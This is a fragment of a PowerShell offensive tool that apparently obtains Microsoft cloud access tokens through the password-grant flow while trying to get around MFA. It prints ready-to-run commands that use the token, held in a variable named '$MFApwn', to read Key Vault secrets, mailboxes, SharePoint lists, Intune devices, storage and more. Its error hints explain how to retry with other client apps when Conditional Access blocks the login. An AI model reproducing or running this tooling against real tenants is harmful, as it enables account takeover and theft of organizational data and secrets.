        $exampleUsage = switch ($Resource) {
            "ARM" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01"'
            }
            "Graph" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://graph.microsoft.com/v1.0/me"'
            }
            "KeyVault" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://<vault-name>.vault.azure.net/secrets?api-version=7.4"'
            }
            "Storage" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"; "x-ms-version" = "2020-10-02"} -Uri "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"'
            }
            "SQLDatabase" {
                'Connect-AzAccount -AccessToken $MFApwn.access_token -AccountId $Username; then use Invoke-Sqlcmd with -AccessToken'
            }
            "DataLake" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://<account>.azuredatalakestore.net/webhdfs/v1/?op=LISTSTATUS"'
            }
            "DevOps" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://dev.azure.com/<org>/_apis/projects?api-version=6.0"'
            }
            "LogAnalytics" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://api.loganalytics.io/v1/workspaces/<workspace-id>/query" -Method POST -Body @{query="SecurityEvent | take 10"}'
            }
            "Monitor" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Insights/metrics?api-version=2021-05-01"'
            }
            "ServiceBus" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://<namespace>.servicebus.windows.net/<queue>/messages/head" -Method POST'
            }
            "EventHubs" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://<namespace>.servicebus.windows.net/<hub>/messages" -Method POST'
            }
            "Exchange" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://outlook.office365.com/api/v2.0/me/messages"'
            }
            "SharePoint" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://<tenant>.sharepoint.com/_api/web/lists"'
            }
            "PowerBI" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://api.powerbi.com/v1.0/myorg/groups"'
            }
            "Intune" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices"'
            }
            "Dynamics" {
                'Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://<org>.crm.dynamics.com/api/data/v9.2/accounts"'
            }
            default {
                'Use $MFApwn.access_token with the appropriate API endpoint'
            }
        }
        Write-Host "    $exampleUsage" -ForegroundColor Gray
    }
    else {
        Write-Host "`n[-] Response received but no access_token field present." -ForegroundColor Yellow
        Write-Host "    Full response:" -ForegroundColor Gray
        $response | ConvertTo-Json -Depth 3 | Write-Host -ForegroundColor Gray
    }
}
catch {
    Write-Host "`n[!] Authentication failed!" -ForegroundColor Red

    # Try to parse detailed error from response
    if ($_.ErrorDetails.Message) {
        try {
            $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
            Write-Host "    Error:       $($errorResponse.error)" -ForegroundColor Red
            Write-Host "    Description: $($errorResponse.error_description)" -ForegroundColor Gray

            # Provide helpful hints based on error
            switch ($errorResponse.error) {
                "invalid_grant" {
                    Write-Host "`n[*] Hint: Invalid credentials or account restrictions." -ForegroundColor Yellow
                    Write-Host "    - Check username/password" -ForegroundColor Gray
                    Write-Host "    - Account may require MFA (bypass failed)" -ForegroundColor Gray
                    Write-Host "    - Account may be locked or disabled" -ForegroundColor Gray
                }
                "unauthorized_client" {
                    Write-Host "`n[*] Hint: Client app not authorized for ROPC flow." -ForegroundColor Yellow
                    Write-Host "    - Try a different -ClientApp value" -ForegroundColor Gray
                    Write-Host "    - ROPC may be disabled for this tenant" -ForegroundColor Gray
                }
                "interaction_required" {
                    Write-Host "`n[*] Hint: Interactive authentication required." -ForegroundColor Yellow
                    Write-Host "    - MFA is enforced for this account/policy" -ForegroundColor Gray
                    Write-Host "    - Conditional Access blocking non-interactive login" -ForegroundColor Gray
                }
                "invalid_client" {
                    Write-Host "`n[*] Hint: Client configuration issue." -ForegroundColor Yellow
                    Write-Host "    - Try a different -ClientApp value" -ForegroundColor Gray
                }
            }
        }
        catch {
            Write-Host "    $($_.Exception.Message)" -ForegroundColor Gray
        }
    }
    else {
        Write-Host "    $($_.Exception.Message)" -ForegroundColor Gray
    }
}
finally {
    # Clean up sensitive data from memory
    Clear-SensitiveData -VariableNames @("UnsecurePassword", "EncodedPassword", "EncodedUsername", "Body", "BSTR")
    $Password = $null
}
